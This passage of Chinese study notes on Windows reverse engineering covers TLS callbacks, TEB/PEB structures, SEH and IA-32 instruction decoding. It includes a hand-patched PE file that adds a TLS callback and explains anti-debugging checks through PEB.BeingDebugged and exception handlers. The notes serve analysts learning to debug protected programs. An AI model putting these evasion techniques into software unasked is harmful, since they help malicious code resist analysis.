NULL);\n&#125;\n\nvoid NTAPI TLS_CALLBACK1(PVOID DllHandle, DWORD Reason, PVOID Reserved)\n&#123;\n    char szMsg[80] = &#123;0,&#125;;\n    wsprintfA(szMsg, \"TLS_CALLBACK1() : DllHandle = %X, Reason = %d\\n\", DllHandle, Reason);\n    print_console(szMsg);\n&#125;\n\nvoid NTAPI TLS_CALLBACK2(PVOID DllHandle, DWORD Reason, PVOID Reserved)\n&#123;\n    char szMsg[80] = &#123;0,&#125;;\n    wsprintfA(szMsg, \"TLS_CALLBACK2() : DllHandle = %X, Reason = %d\\n\", DllHandle, Reason);\n    print_console(szMsg);\n&#125;\n\n// 定义TLS数组\n#pragma data_seg(\".CRT$XLX\")\n    PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLS_CALLBACK1, TLS_CALLBACK2, 0 &#125;;\n#pragma data_seg()\n\nDWORD WINAPI ThreadProc(LPVOID lParam)\n&#123;\n    print_console(\"ThreadProc() start\\n\");\n\n    print_console(\"ThreadProc() end\\n\");\n\n    return 0;\n&#125;\n\nint main(void)\n&#123;\n    HANDLE hThread = NULL;\n\n    print_console(\"main() start\\n\");\n\n    hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);\n    WaitForSingleObject(hThread, 60*1000);\n    CloseHandle(hThread);\n\n    print_console(\"main() end\\n\");\n\n    return 0;\n&#125;\n\n\n运行后，显示\n\n\n\nDLL_PROCESS_ATTACH\n进程的主线程调用main()函数前，已经注册的TLS回调函数(TLS_CALLBACK1、TLS_CALLBACK2)会先被调用执行，此时Reason的值为1，DLL_PROCESS_ATTACH\nmain函数开始前，调用\n\n\n\nDLL_THREAD_ATTACH\n所有TLS回调函数完成调用后，main函数开始调用执行，创建用户线程前，TLS回调函数会被再次调用执行，此时Reason &#x3D; 2 (DLL_THREAD_ATTACH)\n也就是在CreateThread()之前，会调用一次回调函数\n\n\n\nDLL_THREAD_DETACH\nTLS回调函数全部执行完毕后，ThreadProc()线程函数开始调用执行。执行完毕后，Reason &#x3D; 3，DLL_THREAD_ATTACH\nThrodProc()函数执行完毕了，又会调用一次\n\n\n\nDLL_PROCESS_DETACH\nThreadProc()线程函数执行完毕后，一直在等待线程终止的main函数(主线程也会终止)。此时Reason  &#x3D; 0 DLL_PROCESS_DETACH，再次调用TLS回调函数\nmain函数结束后，再次调用\n\n\n\n45.5 调试TLS回调函数Q：像上面一样，直接用调试器无法打开带有TLS回调函数的程序，因为会先运行TLS回调函数，且含有反调试代码，程序就终止了\n\n所以我们需要修改Ollydbg选项，就可以调试了\n\n\nollydbg默认是在ep处暂停，windbg默认是在系统断点处暂停，把ollydbg的改成在system point暂停\n\n在ollydbg2.0中，可以设置暂停在 tls callback处\n\n\n\nQ：调试TLS回调函数\n\n发现这里调用了kernel32!IsDebuggerPresent函数\n\n\n\n在函数内部发现会判断是否是调试事件，所以这里存在反调试\n\n\n45.6 手工添加TLS回调函数\n本节是直接修改Hello.exe文件，为它添加TLS回调函数\n\n修改原程序\n原来的程序运行之后，会显示\n\n\n目标是给他添加TLS回调函数\n\n\n增加最后一个节区的大小\n按照前面讲的，要添加IMAGE_TLS_DIRECTORY结构体和TLS回调函数\n\nQ：向某PE文件添加代码或者数据时，有3种方法\n\n第一，添加到节区末尾的空白区域\n增加最后一个节区的大小\n在最后添加新节区\n\nQ：这里采用第二种方法，像最后一个节区的末尾添加\n\nFile Alignment &#x3D;  200，section alignment 是1000\n\n\n\n我现在用Hxd给它增加200 bytes\n\n\n\n编辑PE文件头Q：.rsrc节区头\n\n首先virtual Size不用改，因为Section Alignment值是1000，现在1B4 + 200 &#x3D; 3B4，仍然小于1000，加载时仍然会按照1000加载到内存中\n\n\n\n改size of raw data为400，向characteristics中增加其他属性\n\n\nE0 00 00 60的含义是\n\n\n\n\n\n\n\n\n\n提示\n由于要在扩展区域内创建IMAGE_TLS_DIRECTORY结构体与TLS回调函数，所以需要向该节区添加IMAGE_SCN_CNT_CODE和IMAGE_SCN_MEM_EXECUTE属性\n此外，还必须向包含IMAGE _TLS_DIRECTORY 结构体的节区添加IMAGE_SCN_MEM_WRITE属性，才能保证正常运行。\nIMAGE_SCN_CNT_CODE：section contains code\nIMAGE_SCN_MEM_EXECUTE：section is executable\nIMAGE_SCN_MEM_WRITE: section is writable\n\n\nQ：IMAGE_DATA_DIRECTORY[9]\n\n新增空白区域的起始地址为9200，RVA就是C200，所以TLS table的地址就是C200, size是18\n\n修改后，查看一下\n\n\n\n设置IMAGE_TLS_DIRECTORY结构体\n也就是向9200处添加IMAGE_TLS_DIRECTORY结构体，按照这样修改\n\n\n在上一步修改完IMAGE optional header data direcroty[9]的tls table之后，此时已经可以看到IMAGE_TLS_DIRECTORY\n\nAddress of callbacks的地址是40C224，它是含有TLS回调函数数组的起始地址，因此把回调函数的起始地址(VA)40C224放入了该位置\n\n\n目前在回调函数中写入的是 C2 0C 00 00 ，是RETN 0C命令，也就是在TLS回调函数中不执行任何操作\n\n\n\n\n\n\n\n\n提示\nTLS回调函数的返回指令不是RETN, 而是RETN 0C指令，因为函数有3个参数，大小是0C，所以需要修正栈\n\n\n编写TLS回调函数\n\n如果reason是1，比较结果是0，不跳转。也就是主线程开始执行的状态下，即第一步\n判断PEB.BeingDebugged，如果处于调试状态，就弹出消息框。\n上面在写汇编的时候，可以直接写CALL user32.MessageBoxA，CALL Kernel32.ExitProcess，因为IAT中有，已经导入了\n\n总结\nTLS主要用于反调试，因为它可以先于EP代码执行\n\n0x46 TEB\nTEB：Thread Environment Block，线程环境块\n\n46.1 TEB\nTEB指线程环境块，该结构体包含进程中运行线程的各种信息，进程中的每个线程都对应一个TEB结构体\n\nTEB结构体的定义\nTEB结构体成员\n借助Windbg的符号文件，可以查看TEB结构体的所有成员\nwin7下的TEB结构体要比Windows XP下的TEB结构体大\n\n重要成员Q：在用户模式中，起重要作用的成员有2个\n\noffset 30处的ProcessEnvironmentBolck是指向PEB结构体的指针，PEB是进程环境块\n\n\n\nNtTib：Thread information block 它是线程信息块\n\n\nExceptionList是指向_EXCEPTION_REGISTRATION_RECORD结构体组成的链表，用于windows os 的SEH\nSelf成员是_NT_TIB的自引用指针，也是TEB结构体的指针，也就是TEB结构体可以用它访问自己的第一个成员 _NT_TIB\n\n\n\n46.2 TEB访问方法Q：如何在用户模式下访问TEB呢？\n\n之前是用windbg访问的，windbg是个内核调试器\n通过os提供的相关API访问\n\nNtdll.NtCurrentTeb()\n在ollydbg 220中打开notepad.exe，选择ntdll，再search for name，找到ntdll!NtCurrentTeb API\n\n\n这个EAX中的值，000DFFCC就是当前线程的TEB的地址\n\n\n发现TEB结构体的地址和FS段寄存器的段内存基址(003C3000)是一样的，所以说明TEB和FS段寄存器之间存在某种关联\n\n\nFS段寄存器Q：SDT\n\nFS在第一部分的笔记中有记录，是16bit，存放附加数据段的段基址\n\n\n其实FS段寄存器用来指示当前线程的TEB结构体\n\nIA32中，进程的虚拟内存大小是4GB，因此需要32位的指针，但是段寄存器大小只有16位，那如何表示进程内存空间中的TEB结构体地址呢？\n\nFS段寄存器并不是直接指向TEB，它持有SDT的索引，而SDT持有实际TEB地址\n\n也就是SDT里面存储的是32位的地址，SDT是Segment Descriptor Table\n\n所以下面这个图，其实是和上面来自于第一部分的这个图是一样的\n\n\n\n\n\n\n\n\n\n\n\n提示\nSDT位于内核内存区域，其地址存储在特殊的寄存器 GDTR(Global Descriptor Table Resiger，全局描述符表寄存器)中。\n\n\nQ：由于段寄存器实际存储的是SDT的索引，所以也被称为段选择符(Segment Selector)\n\n上图46-3中，TEB结构体位于FS段选择符所指的段内存的起始地址处\n\n\n这个时候，我们重新看上面这个图，就可以解释为什么TEB的地址，和FS的起始地址是一样的\n\n因为图46-3告诉我们TEB结构体的起始地址就和FS的起始地址一样\nTEB的_NT_TIB的self指向自身，所以他的值就是段的起始地址\n\n\n\n\nQ：FS:[0x30] &#x3D; PEB起始地址\n\n因为FS:[0x30]&#x3D; PEB:[0x30] &#x3D; ProcesssEnvironmentBlock &#x3D; PEB起始地址\n下图是win7中的TEB\n\n\nQ：FS:[0]  &#x3D; SEH起始地址\n\nFS:[0]  &#x3D; _NT_TIB[0] &#x3D; exceptionlist &#x3D; address of SEH\nSEH是Windows系统中的结构化异常处理机制，常用于反调试技术\n\n\n0x47 PEB47.1 PEB\nPEB：process environment block，进程环境块，是存放进程信息的结构体\n\nPEB访问方法Q：获取PEB结构体\n\n上面知道了TEB位于FS的起始地址，PEB位于FS:[30]处\n\n所以可以通过下面2种方法获取\n\nMOV  EAX, DWORD PTR FS:[30]\n\n先获取TEB，再通过TEB的ProcessEnvironmentBlock\nMOV EAX , DWORD PTR FS:[18] \nMOV EAX, DWORD PTR DS:[EAX + 30] \n\n\n打开notepad.exe，在ep处输入上面的指令，然后f7执行\n\n\n\nPEB结构体的定义\n47.2 PEB的重要成员\nPEB.BeingDebugged\nkernel32.dll中有个Kernel32!IsDebuggerPresent()  API，判断是不是进程处于调试状态，并返回结果\n\n这个API通过PEB.BeingDebugger来确定是否正在调试进程，是返回1，否则返回0\n\n\n这个代码就是先获取了TEb的地址，再获取PEB的地址，使用DS:[EAX + 30]的原因是DS的起始地址是0\n\n\n此时PEB.BeingDebugged的成员的地址为3C80002，值为1，所以是True，正在调试状态\n\n\n\n\n\n\n\n\n\n提示\nWindows7中IsDebuggerPresent()API是在Kernelbase.dll中实现的。\n而在WindowsXP及以前版本的操作系统中，它是在 kernel32.dll中实现的\n\n\nPEB.ImageBaseAddress\nPEB.ImageBaseAddress用来表示进程的ImageBase\n\nGetModuleHandle()  API用来获取ImageBase\n\n\n向lpModuleName的参数赋值为Null，调用GetModuleHandle() 函数将返回进程被加载的ImageBase\n\n这个代码就是获取PEB.ImageBaseAddress的地址\n\n\n\n\nPEB.Ldr\nPEB.Ldr指向_PEB_LDR_DATA结构体\n\n\n当模块（DLL）被加载到进程后，通过PEB.Ldr可以直接获取该模块的加载基地址\n\n_PEB_LDR_DATA结构体有3个 _ LIST_ENTRY类型的成员，该结构体定义如下：\n\n\n它提供了双向链表的机制，链表中保存着哪些信息呢？\n\n保存了_LDR_DATA_TABLE_ENTRY结构体的信息\n\n\n每个加载到进程中的DLL模块，都有和他对应的LDR_DATA_TABLE_ENTRY结构体，这些结构体相互连接，最终形成_LIST_ENTRY双向链表\n\n\n\n_PEB_LDA_DATA结构体中存在3种链表，也就是存在多个LDR_DATA_TABLE_ENTRY结构体，并且有3种链接方法\n\n\nPEB.ProcessHeadp &amp; PEB.NtGlobalFlag\nPEB.ProcessHeap与PEBNtGlobalFlag成员(像PEB BeingDebugged成员一样)应用于反调试技术。\n若进程处于调试状态，则ProcessHeap与NtGlobalFlag成员就持有特定值。\n\n0x48 SEH(Structured Exception Handler)\nSEH是Windows os系统默认的异常处理机制。\n在逆向中，也大量用于反调试程序\n\n48.1 SEH\nSEH是windows操作系统中提供的异常处理机制，在程序代码中使用 _ try 、_ except、__finally关键字来实现\n\n\n\n\n\n\n\n提示\nSEH与C++中的 try、catch 异常处理具有不同结构，请各位不要混淆。\n从时间上看与C++的 try、catch 异常处理相比, 微软先创建出了SEH机制, 然后才将它搭载到 VC++中。\n所以SEH是一种从属于VC++开发工具和Windows 操作系统的异常处理机制。\n\n\n48.2 SEH练习\nseh.exe故意触发了内存非法访问(Memory Access Violation)异常，然后通过SEH机制处理该异常\n并且使用PEB信息向程序添加简单的反调试代码\n\n正常运行\n调试运行\n按f9后发现因为异常暂停运行，程序停在了401019处\n\n\n\n地址401019处的指令用来触发异常  MOV DWORD PTR DS:[EAX], 1  当前EAX的值为0，所以这个指令的意义是把1写入内存地址0。\n但试图向尚未分配的内存地址0写入某值时，就会触发内存非法访问异常\n\n\n\n\n\n\n\n提示\n内存地址0虽然属于seh.exe进程的用户内存区域，但是由于是未分配的空间，所以无法随意访问。\n查看Ollydbg的内存映射view memory，就可以看到进程中内存地址0被标识为未分配区域\n\n\n我不知道是不是因为这里没有内存地址0，所以是未分配\n\n\n\nQ：为什么调试进程发生异常时会暂停\n\n在异常暂停处，我们发现ollydbg提示向内存0写入出现访问异常。可以使用shift run去把异常抛给程序\n\n\nQ：按shift + f9继续运行\n\n这里发现现在显示的内容和正常是不一样的\n\n\n\n程序在正常运行和调试运行下使用的异常处理方式是不同的\n\n\n\n\n\n\n\n提示\n调试运行练习示例时，有时调试器不会像上图 那样暂停，而会一直正常运行\n这是因为设置了 OllyDbg 的选项，或者安装了某个特定插件。遇到这种情况请参考后面“设置OllyDbg选项”的内容。\n\n\n48.3 os的异常处理方法\n同一程序在正常运行和调试运行时行为不同，是因为windows os的异常处理方法不同\n\n正常运行时的异常处理方法\n进程运行中如果发生异常，os会委托进程处理。\n\n若进程中存在具体的异常处理，如SEH异常处理器代码，就能顺利处理相关异常。\n\n如果相关异常没法处理，os就会启动默认的异常处理机制，终止进程运行\n\n\n\n调试运行时的异常处理方法\n参考第4部分的笔记\n\n若调试进程内部发生异常，os会把异常抛给调试进程处理。调试器几乎拥有被调试者的所有权限，可以运行、终止被调试者。还拥有被调试进程的虚拟内存、寄存器的读写权限。\n\n被调试者内部发生的所有异常都由调试器处理。所以调试过程中发生的所有异常都先交由调试器管理(被调试者的SEH依据优先顺序推给调试器)\n\n被调试者发生异常时，调试器就会暂停运行，采用某种措施处理异常，完成后继续调试。\n\n\n\nQ：当被调试进程遇到异常后，调试器的处理方法\n\n直接修改异常：代码、内存、寄存器\n\n被调试者发生异常时，会暂停在异常处，调试器可以直接修改\n\n\n\n\n\n\n\n提示\n\n遇到上面的异常时，可以直接修改\n因为是EAX的地址错误，所以可以把EAX的地址值改成有效的内存地址\n由于401019地址处的代码发生了异常，可以把它改成NOP指令，让程序继续运行\n直接使用ollydbg的new orign here功能改变程序的运行路径，因为不能修改EIP寄存器，可以用这种方法\n这个相当于跳过异常的代码\n\n\n\n\n\n\n\n​\t\t:::\n\n将异常抛给被调试者处理\n如果被调试者内部存在SEH(异常处理函数)，可以处理异常。那就把异常通知发送给被调试者，让他自己处理。这和程序正常运行时的处理方式一样，让进程自己处理。\n上面使用Ollydbg的shift + f9就是把异常抛给被调试者\n\n\nos的默认异常处理机制\n如果调试器和被调试者都无法处理当前发生的异常，那么os的默认异常处理机制会处理它，终止被调试的进程，同时结束调试。\n\n\n\n48.4 异常\n下面是windows os中定义的异常\n\n\nEXCEPITON_ACCESS_VIOLATION(C0000005)\n试图访问不存在或无访问权限的内存区域时，就会发生这个异常\n\n\n\nEXCEPTION_BREAKPOINT\n在运行代码中设置断点后，CPU尝试执行断点地址处的指令后，就会发生EXCEPTION_BREAKPOINT异常。\n调试器是利用异常来实现断点功能的\n\nQ：INT3\n\n设置断点的汇编指令为INT3，对应的IA-32指令是0xCC\n\nCPU运行过程中，执行到0xCC，就会暂停运行。\n\n在Ollydbg设置断点，看是不是真的会变成0xCC\n\n\n这里发现其实并没有变成CC。这是因为ollydbg中，f2设置的断点是临时断点(User Temporary Break Point)，所以不需要在调试画面中显示。如果显示了，会降低代码的可读性，实际上，在进程的内存中，这里已经把68改成CC了。\n\n将进程内存转储后，使用hxd可以看到更改后的0xcc\n\n\n以上就是断点异常的工作原理，为程序调试带来很大的遍历。我们可以用hxd打开PE文件，修改EP地址对应的文件偏移处的第一个字节为CC，然后运行PE文件时，就会发生EXCEPTION_BREAKPOINT异常，经过os的默认处理机制，就会让它停止运行。如果在系统注册表中将默认调试器设置为Ollydbg，那么发生 这个异常时，就会启动Ollydbg调试器，attach刚才发生异常的进程，交由调试器处理。\n\n\nQ：关于内存转储，第三部分的笔记\n\nEXCEPTION_ILLEGAL_INSTRUCTION(C000001D)\nCPU遇到无法解析的指令时，会引发这个异常。比如0FFF在x86中未定义，CPU遇到这个指令就会触发EXCEPTION_ILLEGAL_INSTRUCTION\n\nEXCEPTION_INT_DIVIDE_BY_ZERO(C0000094)\nINTEGER(整数)除法运算中，若分母为0，就会引发EXCEPTION_INT_DIVIDE_BY_ZERO。\n编写应用程序时偶尔会发生该异常，分母为变量时，分母瞬间变为0，就会触发这个异常。\n\nEXCEPTION_SINGLE_STEP(80000004)\nSingle Step的含义是执行一条指令，然后暂停\nCPU进入单步模式后，每执行一条指令，都会引发EXCEPTION_SINGLE_STEP异常，暂停运行。\n将EFLAGS寄存器的TF(Trap Flag)位设置为1后，CPU就会进入单步工作模式\n\n48.5 SEH详细说明SEH链\nSEH以链的形式存在，第一个异常处理器如果未处理相关异常，就会被传递到下一个异常处理器，直到处理\n\nSEH是由_EXCEPTION_REGISTRATION_RECORD结构体组成的链表\n\n\nNext成员是指向下一个_EXCEPTION_REGISTRATION_RECORD结构体的指针，Handler成员是异常处理函数。若Next的值是FFFFFFFF，则表示它是链表的最后一个节点\n\n\n\n异常处理函数的定义\n也就是Handler的定义\n\n\n\n这个函数接收4个输入，返回名为EXCEPTION_DISPOSITION的枚举类型\n\n这个异常处理函数由系统调用，是一个回调函数。系统调用时，会给出函数中的4个参数，这4个参数中保存着异常相关的信息\n\n第一个参数指向EXCEPTION_RECORD的指针\n\n\n这个结构体中ExceptionCode用来指出异常类型\nExceptionAddress用来表示发生异常的代码地址\n\n\n第三个参数是指向CONTEXT结构体的指针\n\nCONTEXT结构体用来保存CPU寄存器的值，在多线程的环境下，每个线程内部都有一个CONTEXT结构体\n当CPU暂时离开当前线程去执行其他线程时，CPU寄存器的值就会保存到当前线程的CONTEXT结构体。\nCPU再次运行该线程时，就会用保存在CONTEXT结构体的值覆盖CPU寄存器的值，然后从暂停的代码处继续运行\n\n\n\n\n:::tip\n多线程的实现基于 CPU的时间片切分机制(Time-Slicing)。\n这种机制下，CPU 会用一定时间 (时间片) 依次运行各线程，时间片极短，使多个线程看上去就像在同时运行一样(根据线程的优先级,各线程在获取CPU控制权的次数上有差异)。\n\n\nQ：在发生异常的时候，是怎么个流程呢？\n\n执行异常代码的线程就会终止运行，转而运行SEH（异常处理函数）\n\nos会把线程中的CONTEXT结构体传递给异常处理函数，CONTEXT结构体在偏移为B9处的参数是Eip。\n\n在异常处理函数中，把eip设置成其他地址，函数返回。\n\n此时之前暂停的线程就会执行新的EIP地址处的代码\n\n下面是异常处理函数的返回值，是EXCEPTION_DISPOSITION\n\n\n\n\n如果返回0，就继续执行异常代码。如果返回1，表示当前的异常处理器无法处理，就运行下一个异常处理器处理。\n\nTEB.NtTib.ExceptionList\n在46.1中，我们学过_NT_TIB的第一个成员就是ExceptionList，它是指向_EXCEPTION_REGISTRATION_RECORD结构体的指针，也就是指向SEH链的指针\n\n\n它的地址是FS:[0]\n\n\nSEH安装方法\n在c中使用 __ try、__ except、__finally就可以向代码中添加SEH\n\n汇编中添加SEH的方法是\n\n\n在程序中安装SEH，就是把自身的异常处理器添加到已有的SEH链中\n\n&#x3D;&#x3D;所以上面就是？？？&#x3D;&#x3D;\n\n\n48.6 练习 seh.exeQ：首先运行程序到401000main函数处，接下来的3条指令和代码48-8是一样的\n\n首先push ep\n\n接着push FS:[0]，就是exceptionList，这里会在栈中创建_EXCEPTION_REGISTRATION_RECORD结构体\n\n这里知道它的地址是19FF64，在栈中可以看到它的next指针指向的地址是19FFCC，handler异常处理函数的地址是00402730\n\n&#x3D;&#x3D;为什么可以在栈中看呢？？&#x3D;&#x3D;\n\n\n\n\n找SEH链，当到19FFE4处时，它的next指针是FFFFFFFFF，表明SEH链到了结尾\n\n这个异常处理函数在77D992CD，位于ntdll.dll区，是os的默认异常处理器\n\n\n创建进程时，os自动产生默认的SEH\n\n\n添加SEHQ：在运行完40100C处的指令后，发现生成了新的注释\n\nnext &#x3D; 19FF65，Handler &#x3D; 40105A\n\n\n\n此时发现FS:[0]处也改成了新添加的SEH的地址，说明是往头节点插入的新节点\n\n\n用一个更形象的图说明上述过程\nPUSH handler\nPUSH DWORD PTR FS:[0]\nMOV DWORD PTR FS:[0] ESP\n\n\n19FF64是原来的ExceptionList的头节点\n现在向头节点插入了一个新的seh。\n所以头节点指向现在的，现在的指向原来的\n\n\n\n\nQ：OllyDbg调试器提供了查看SEH链的功能\n\nView - SEH CHAIN\n\n\n\n发生异常\n运行到401019处，会发生EXCEPTION_ACCESS_VIOLATION异常\n\n\n\n因为处在调试中，所以异常会由调试器处理\n\n在40105A处设置断点，按shift + f9，把异常抛给被调试者处理\n\n\n被调试者就会调用自身的SEH链处理\n\n\n查看异常处理器参数Q：现在程序在40105A地址处\n\n\n可以理解成现在在异常处理函数中，此时栈中的参数含义是：\n\n\n第一个参数是pRecord，所以ExceptionCode的地址是00000005，ExceptionAddress是00401019\n\n\n第二个参数是指向EXCEPTION_REGISTRATION_RECORD结构体的指针pframe，它的值是12FF28，也就是上面我添加的SEH的地址\n\n\n第三个参数是pContext，指向CONTEXT的指针，这个偏移B8处的是EIP的地址\n\n\n最后一个参数供系统内部使用，可以忽略\n\n\n\n\n调试异常处理器\n40105A地址处的异常处理器，存在着调试器检测代码，也就是反调试代码\n\n\n\n这里的EAX是PEB，EAX + 2是BeingDebuged，如果他是1，说明正在调试\n\n接着会把401023给eip。也就是表明在异常处理函数结束之后，会执行401023处的代码。\n\n\n401023处的字符串是Debugger detected，也就是弹出消息框。在401023处设置一个断点。\n\n\n\n\n接着EAX &#x3D; 0，程序退出。返回值是0代表EXCEPTION_CONTINUE_EXECUTION，表示异常得到处理。相关线程可以继续运行\n\n在return之后，控制权返回至ntdll.dll模块中的代码区域，它属于系统区域。\n\n\nf9继续运行，会运行到401023处\n\n再继续运行，就会弹出消息框，接着程序会跳转到删除SEH的代码处。\n\n\n\n删除SEH\n此时的栈中是我上面新添加的SEH\nPOP DWORD PTR FS:[0]指令，会读取栈值19FF28，并放入FS:[0]。并从栈中pop掉这个值\n也就是把当前SEH的next给FS:[0]\n\n\n之后 ADD ESP 4，把异常处理函数也删除\n\n\n48.7 设置Ollydbg选项Q：在上面的原理作用下，程序正常运行和调试运行下的代码不一样，有没有更方便的调试方法？\n\nOllydbg提供了调试选项，调试中的程序发生异常时，调试器不会暂停，会自动将异常派送给被调试者\n\n在Ollydbg菜单栏中选择Options - Debugging options，打开Exceptions选项卡\n\n\n\n忽略kernel32中发生的内存非法访问异常\n默认是选中的\n\n向被调试者派送异常\n前5个前面都已经介绍过了\n\n\n\n第6个是ALL FPU exceptions。FPU是Floating Point Unit浮点运算单元，是专门用于浮点数运算的处理器。他有一套专用指令，和普通x86的形态结构不同。\n选上之后，处理FPU指令过程发生异常时，会把异常让被调试者处理。\n\n其他异常处理\n这个就是可以自定义异常\n\n\n简单练习\n还是seh.exe，如果勾选了上面的所  有，直接就会显示下面的内容。\n\n\n程序通过SEH，检测是否程序处在调试状态，从而弹出和正常不一样的框\n\n\n0x49 IA-32指令49.1 IA-32指令\n指令是指CPU能识别的机器语言，machine language\n\nIA-32指令是指IA-32(Intel Architecture 32位)系列CPU使用的指令\n\n\n红框中的每一条都是指令，E8 CC270000这种就是IA-32指令\n\n程序员通过java、python等编写程序，cpu使用机器语言。所以编写的程序通过编译、链接最后转换为CPU可以识别的语言\n\n也就是我之前在program analysis中学习的那个过程\n\n\n\n49.2 常用术语\n\n使用C&#x2F;C++创建出PE文件后，源代码就转换成了机器码\n机器码是由 0 1构成的，我们很难读懂它。所以一般把机器码转换成16进制代码。\n再通过调试器内嵌的反汇编器把机器码转换成反汇编代码\n\n反汇编器\nOllydbg内嵌有IA-32的反汇编器\nA区域是16进制的IA-32指令，B区域是对应的反汇编代码，C区域是它在内存中的状态\n\n\n\n反汇编代码由助记符 (Mnemonic)+ 操作数(Operand)构成。PUSH 40B384中的PUSH就是助记符，40B384就是操作数\n内嵌在调试器中的反汇编器会把C区的大段的机器码切分成A区中 的一条条的指令，再把A区中的指令反汇编成B区的反汇编代码。\n\n反编译器\n反汇编器：把机器码转成反汇编代码\n反编译器：把机器码转成类似于源代码的代码\n\n49.3 IA-32指令格式\nIA-32由6部分组成，其中操作码是必须的\n\n\n指令前缀 Instruction Prefixes\n它是可选的\n前缀项大小为1bytes\n\n\n操作码 Operation Code\n它用来表示实际的指令\n\n长度为1 - 3 bytes，常见的大多数都是1byte。\n\n操作码通常都带有操作数(operand)，操作数种类有寄存器、内存地址、常量\n\n\n操作码种类很多，解析时需要查看Intel用户手册的操作码映射\n\n\nModR&#x2F;M\nModR&#x2F;M是个可选项，用来辅助说明操作码的操作数(操作数的个数、种类[寄存器、地址、常量])\n\n\nModR&#x2F;M项拥有1个字节(8位)长度，分为3部分。各部分含义如下：\n\n\n\n\nSIB Scale-Index-Base\n也是一个可选项，用来辅助说明ModR&#x2F;M\n\n操作码的操作数为内存地址时，需要和ModR&#x2F;M项一起用\n\nSIB也拥有1个字节的长度，分成3部分\n\n\n\n\n位移 Displacement\n也是可选项\n\n操作码的操作数为内存地址时，用来表示位移操作\n\n\n位移的长度是 1  2  4字节\n\n\n立即数\n立即数也是个可选项，操作码的操作数为常量时，这个常量就称为立即数\n\n\n立即数的长度是1 2 4字节\n\n\n49.4 打印iA-32指令\n打印intel IA-32指令\nhttps://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html\n\n\n\n\n要打印的截图\n这个Table A-1是用来说明Table A-2中的上标的\n\n\n\nTable A-2是一字节的操作码\n\n\n\n\nTable A-3\n\n\n\n\n\n寻址方法，code for addressing method\n\n\n\n\n操作数类型\n\n\n- \n\n\nTable A-6\n\n\n\n49.5 指令解析练习操作码映射41 INC ECX\n\n\n把这个41拆开变成，4 代表行，1代表列。在Table A-2中查\n\n\n解析成 INC ECX。\n\n根据Table A 2-1，i64表示不在75位中用，o64表示只在64位中用。所以操作码选择INC，操作数选择32位中的ECX。要是在64位中就选REX.B\n\n\n对应的IA-32指令格式是\n\n\n\n操作数68 A0B44000 PUSH 0040B4A0\n\n\n\n解析成 PUSH Iz\n\nIz表示操作数的类型，大写字母 I 指寻址方法(Addressing Method)，小写字母z 指操作数类型(Operand Type)\n\n查看A 2.1，I表示立即数，再查看 A2.2，找到操作数类型，在32位系统下，是double world，也就是4 bytes\n\n\n\n所以操作码 68对应的指令就是push 4个字节的立即数，所以继续读取68之后的四个字节\n\n对应的IA-32指令格式如下\n\n\n\nModR&#x2F;M89C1 MOV ECX,EAX\n\n\n首先解析89，在table A-2中查找到是 MOV Ev,Gv\n\n接着查找操作数类型v表示4字节\n\n查找寻址方法E G。首先 E G 都和ModR&#x2F;M有关。E表示寄存器或者内存地址形式的操作数。G表示寄存器形式的操作数。\n\n\n所以查看操作码后面的一个字节C1，即是ModR&#x2F;M选项。、\n\nC1的解析形式如下\n\n\n接下来我们就查表\n\nE和G表示寻址方法，分别出现在下图的E区和G区。小写字母v表示操作数类型，上面查表得到是dword，是32位。\nE中既有内存地址也有寄存器。ModR&#x2F;M值从00 到BF对应的都是E区中的内存地址，从C0到FF对应的都是寄存器\n而G区只有寄存器，ModR&#x2F;M的REG从000到111\n\n\n在下表中找到C1，它对应的32位在E区是ECX，在G区对应的是EAX\n在下表中可以找到C1二进制形式中每一部分对应的值，它可以唯一确定C1。\n\n\n\n所以最终指令解析为，MOV ECX,EAX\n\n用IA-32指令格式表示如下\n\n\n\nGroup\nGroup 指令把操作码和ModR&#x2F;M组合起来，让操作码最多可以表示8种形式的映射\n\n83C3 12 ADD EBX,12\n\n\n操作码83对应的是Grp1 Ev,Ib。由前面知道，Ev表示4个字节的寄存器，Ib代表1字节的立即数\n紧跟在83后面的C3是ModR&#x2F;M，查找group表 Table A-6\n\n\n\n因为操作码是 83，Grp1，且ModR&#x2F;M的第3 4 5bit是000。所以就是ADD\n\n\n\n现在就解析成了ADD Ev,Ib\n\n接着查ModR&#x2F;M表，确定Ev，因为v是4bytes，所以确定是EBX\n\n现在变成了 ADD EBX,Ib，Ib就读取后面1个字节的立即数\n\n所以最终就变成了 ADD EBX,12\n\n\n\n前缀 Prefix66:81FE 3412 CMP SI,1234\n\n\n对于前缀指令，竟然也查Table A-2，就是one byte 操作码的表\n\n\n66表示操作数大小的前缀。更确切的说是Operand-Size Override Prefix。Prefix: 66意思是把32位大小的操作数识别为16位，或者把16位大小的操作数识别为32位\n\n81是操作码，表示 Grp1 Ev,lz，且是16byte的\n\n综上，就变成了\n66:81FE 3412 Grp1 Ev,lz  operand Size &#x3D; 16 bit\n\n81后面紧跟的FE，拆开\n\n\n所以Grp1就表示成CMP，查表可知\n\n\n66:81FE 3412 CMP Ev,lz operand Size &#x3D; 16 bit\n\n\n对于Ev，就还是查表，因为是16bit。所以对应的就是SI\n\n\n记者对于lz，就是读取16bit的立即数，也就是2个字节\n6681FE  CMP SI,1234\n\n\n双字节操作码\n单字节操作码不够用时，扩展为双字节操作码。\n双字节操作码中第一个字节恒为0F，所以和单字节操作码的映射方式是一样的\n\n0F85 FA1F0000 JNZ XXXXXXXX\n\n\n首先找到0F，表示是2-byte的Escape符号。继续在Table A-3中找85\n\n\n\n可以看到它就是JNE&#x2F;JNZ\n\n\n\n\n\n\n\n\n提示\nJcc为Conditional Jump(条件跳转)指令一般。这种条件跳转指令之前都有比较语句(CMP、TEST)，并根据比较的结果决定是否跳转。\nJcc 指令有多种形式，示例中的0F85被解析为JNE(Jump Not Equal)或 JNZ(Jump Not Zero)指令。(两条指令含义相同)。\nJcc指令(0F80~0F8F)的操作数在Table A-3 中显示为“Long-displacement”操作数。一般Long表示4个字节(32位)，Short表示1个字节(8位)。所以Jcc指令的操作数为4字节大小的Displacement(移位值)。\n\n\n\n因为JNE指令的操作数是4 bytes大小的移位值，所以继续读取操作码后面的4 bytes，整条指令就是\n0F85 FA1F0000 JNE 00001FFA\n\n\n\n\n\n\n\n\n提示\n这里的00001FFA是相对位移，要计算它的实际地址。\n假设当前的eip是401000，这条指令的长度是6bytes。所以跳转的实际地址是 401000 + 6 + 1FFA &#x3D; 